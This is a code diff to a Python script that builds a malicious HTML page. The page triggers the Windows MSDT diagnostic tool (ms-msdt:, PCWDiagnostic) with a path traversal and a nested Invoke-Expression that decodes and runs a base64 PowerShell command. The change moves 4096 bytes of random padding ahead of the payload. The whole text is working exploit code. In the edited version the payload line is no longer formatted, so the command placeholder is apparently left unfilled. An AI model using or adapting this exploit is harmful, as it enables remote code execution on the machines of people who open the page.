@@ -114,11 +114,18 @@ def main(args):
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
     # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
-    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
-    html_payload += (
+    # html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
+    # html_payload += (
+    #     "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
+    #     + "\n</script>"
+    # )
+    html_payload = f"""<script>""" + (
         "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
-        + "\n</script>"
+        +"\n"
     )
+    html_payload += """location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
+    html_payload += "\n</script>"
+
 
     # Create our HTML endpoint
     with open(os.path.join(serve_path, "index.html"), "w") as filp:
